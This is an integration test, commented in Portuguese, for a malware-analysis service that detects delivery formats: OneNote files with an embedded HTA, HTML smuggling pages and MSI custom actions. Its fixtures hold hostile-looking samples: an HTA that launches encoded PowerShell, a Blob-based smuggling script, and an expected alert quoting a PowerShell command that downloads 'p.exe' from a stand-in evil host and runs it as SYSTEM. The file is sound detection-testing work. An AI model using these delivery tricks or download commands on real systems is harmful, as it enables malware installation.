import { readFileSync } from 'node:fs';
import { join } from 'node:path';

import { buildApp } from '../../src/app';
import { hashPassword } from '../../src/lib/crypto';
import { prisma } from '../../src/lib/prisma';
import { ensureBucket } from '../../src/lib/s3';

let fails = 0;
const ok = (label: string, cond: boolean | undefined, detail: unknown = '') => {
  if (!cond) fails++;
  console.log(`${cond ? 'ok  ' : 'FALHA'} ${label}${cond ? '' : ' ' + JSON.stringify(detail)}`);
};
const DIR = join(process.env.TEST_TMP!, 'pe');

const guid = (g: string) => {
  const b = Buffer.from(g.replace(/[{}-]/g, ''), 'hex');
  return Buffer.concat([
    Buffer.from(b.subarray(0, 4)).reverse(),
    Buffer.from(b.subarray(4, 6)).reverse(),
    Buffer.from(b.subarray(6, 8)).reverse(),
    b.subarray(8),
  ]);
};
const fileObject = (data: Buffer) => {
  const size = Buffer.alloc(8);
  size.writeBigUInt64LE(BigInt(data.length));
  return Buffer.concat([
    guid('{BDE316E7-2665-4511-A4C4-8D4D0B7A9EAC}'),
    size,
    Buffer.alloc(12),
    data,
  ]);
};

// Formatos de entrega (plans/caca-e-formatos, item 4) pelo envio de verdade: o OneNote, a pagina
// com HTML smuggling e o MSI (gerado pelo msibuild em fixtures/pe/gen.sh) viram amostras filhas, o
// card guarda de onde cada uma saiu, o risco conta o disfarce e os alertas saem em ingles.
async function main() {
  await ensureBucket(3, 500);
  const app = await buildApp();
  await app.ready();
  const passwordHash = await hashPassword('senha-123!');
  await prisma.user.create({
    data: { email: 'ana@x.io', displayName: 'Ana', role: 'ANALYST', passwordHash },
  });
  const cookie = String(
    (
      await app.inject({
        method: 'POST',
        url: '/api/auth/login',
        payload: { email: 'ana@x.io', password: 'senha-123!' },
      })
    ).headers['set-cookie'],
  ).split(';')[0];
  const upload = async (name: string, data: Buffer): Promise<string> => {
    const boundary = '----dl' + Math.random();
    const body = Buffer.concat([
      Buffer.from(
        `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${name}"\r\nContent-Type: application/octet-stream\r\n\r\n`,
      ),
      data,
      Buffer.from(`\r\n--${boundary}--\r\n`),
    ]);
    const r = await app.inject({
      method: 'POST',
      url: '/api/entries/file',
      payload: body,
      headers: { cookie, 'content-type': `multipart/form-data; boundary=${boundary}` },
    });
    return r.json().entry.id;
  };
  type Delivery = {
    format: string;
    risk: string;
    alerts: { level: string; text: string }[];
    files: { name: string; type: string; source: string; entryId?: string }[];
    msi?: {
      product: { name: string };
      customActions: { action: string; kind: string; flags: string[] }[];
    };
  };
  const delivery = async (id: string) =>
    ((await prisma.entry.findUnique({ where: { id }, select: { staticInfo: true } }))
      ?.staticInfo as { delivery?: Delivery; script?: { language: string } } | null) ?? null;
  const children = (id: string) =>
    prisma.entry.findMany({
      where: { parentEntryId: id },
      select: { id: true, originalFilename: true, description: true, staticInfo: true },
      orderBy: { originalFilename: 'asc' },
    });

  // ---- 1. OneNote: o HTA anexado vira filha, a imagem nao.
  const hta = Buffer.from(
    '<html><hta:application/><script>new ActiveXObject("WScript.Shell").Run("powershell -enc AAAA")</script></html>'.repeat(
      3,
    ),
  );
  const png = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47]), Buffer.alloc(700)]);
  const one = await upload(
    'fatura.one',
    Buffer.concat([
      guid('{7B5C52E4-D88C-4DA7-AEB1-5378D02996D3}'),
      Buffer.alloc(32),
      fileObject(png),
      fileObject(hta),
    ]),
  );
  const oneInfo = await delivery(one);
  const oneKids = await children(one);
  ok(
    'OneNote: o HTA vira filha com o caminho de volta; a imagem fica',
    oneInfo?.delivery?.format === 'onenote' &&
      oneInfo.delivery.risk === 'high' &&
      oneKids.length === 1 &&
      oneKids[0].originalFilename === 'embutido-2.hta' &&
      oneInfo.delivery.files[0].entryId === oneKids[0].id &&
      /^Extraído do OneNote "fatura\.one" \(objeto 2\)\.$/.test(oneKids[0].description ?? ''),
    { info: oneInfo?.delivery, kids: oneKids.map((k) => [k.originalFilename, k.description]) },
  );
  ok(
    'a filha HTA passa pela análise de scripts',
    (oneKids[0]?.staticInfo as { script?: { language: string } })?.script?.language === 'hta',
    (oneKids[0]?.staticInfo as { script?: unknown })?.script,
  );

  // ---- 2. HTML smuggling.
  const zip = Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.alloc(3000, 1)]);
  const page = await upload(
    'boleto.html',
    Buffer.from(
      `<html><script>const d = atob("${zip.toString('base64')}");
       const u = URL.createObjectURL(new Blob([d])); const a = document.createElement('a');
       a.href = u; a.download = 'boleto.zip'; a.click();</script></html>`,
    ),
  );
  const pageInfo = await delivery(page);
  const pageKids = await children(page);
  ok(
    'HTML smuggling: o ZIP vira filha, o JavaScript é analisado e o alerta é alto',
    pageInfo?.delivery?.risk === 'high' &&
      pageKids[0]?.originalFilename === 'carga-1.zip' &&
      pageInfo.script?.language === 'javascript',
    { info: pageInfo?.delivery, kids: pageKids.map((k) => k.originalFilename) },
  );

  // ---- 3. MSI (msibuild).
  const msi = await upload('atualizador.msi', readFileSync(join(DIR, 'teste.msi')));
  const msiInfo = (await delivery(msi))?.delivery;
  const msiKids = await children(msi);
  const actions = Object.fromEntries(
    (msiInfo?.msi?.customActions ?? []).map((a) => [a.action, [a.kind, a.flags.join(',')]]),
  );
  ok(
    'MSI: produto e as ações com o tipo traduzido',
    msiInfo?.msi?.product.name === 'Atualizador Teste' &&
      actions.RodaDll?.[0] === 'DLL da tabela Binary' &&
      actions.RodaJs?.[0] === 'JScript da tabela Binary' &&
      actions.Inline?.[0] === 'VBScript embutido na ação' &&
      actions.Baixa?.[0] === 'EXE com linha de comando' &&
      actions.Baixa?.[1].includes('como SYSTEM (sem personificação)') &&
      actions.SetProp?.[0] === 'Define uma propriedade',
    actions,
  );
  ok(
    'MSI: a DLL, o JScript, o VBScript da ação e o CAB viram filhas',
    JSON.stringify(msiKids.map((k) => k.originalFilename)) ===
      JSON.stringify(['AcaoDll.dll', 'Inline.vbs', 'ScriptJs.js', 'midia.cab']) &&
      msiInfo?.files.every((f) => f.entryId),
    msiKids.map((k) => k.originalFilename),
  );
  ok(
    'MSI: o comando como SYSTEM no alerta alto e a URL nos IOCs sugeridos',
    msiInfo?.alerts.some(
      (a) =>
        a.level === 'high' &&
        a.text ===
          'Ação Baixa (como SYSTEM) roda: powershell -w hidden -c iwr http://msi.evil.test/p.exe -o p.exe',
    ) &&
      (
        (await prisma.entry.findUnique({ where: { id: msi }, select: { staticInfo: true } }))
          ?.staticInfo as { iocCandidates: { value: string }[] }
      ).iocCandidates.some((i) => i.value.includes('msi.evil.test')),
    msiInfo?.alerts,
  );
  const vbs = msiKids.find((k) => k.originalFilename === 'Inline.vbs');
  ok(
    'o VBScript da ação passa pela análise de scripts',
    (vbs?.staticInfo as { script?: { language: string } })?.script?.language === 'vbscript',
  );

  // ---- 4. Risco e inglês.
  const risk = (
    await app.inject({ method: 'GET', url: `/api/entries/${msi}/risk`, headers: { cookie } })
  ).json().risk;
  ok(
    'risco: o formato de entrega conta',
    risk.reasons.some(
      (r: { source: string; weight: number }) =>
        r.source === 'Formato de entrega' && r.weight === 35,
    ),
    risk.reasons,
  );
  const en = (
    await app.inject({
      method: 'GET',
      url: `/api/entries/${msi}`,
      headers: { cookie, 'accept-language': 'en' },
    })
  ).json();
  const enDelivery = (en.entry?.staticInfo ?? en.staticInfo)?.delivery as Delivery | undefined;
  ok(
    'em inglês: alertas, tipos e flags',
    enDelivery?.alerts.some(
      (a) =>
        a.text ===
        'Action Baixa (as SYSTEM) runs: powershell -w hidden -c iwr http://msi.evil.test/p.exe -o p.exe',
    ) &&
      enDelivery.alerts.some((a) => a.text === 'Action Inline: VBScript embedded in the action') &&
      enDelivery.msi?.customActions.some((a) => a.flags.includes('as SYSTEM (no impersonation)')),
    enDelivery?.alerts,
  );

  await app.close();
  await prisma.$disconnect();
  console.log(fails ? `\n${fails} falha(s)` : '\nTudo certo');
  process.exit(fails ? 1 : 0);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
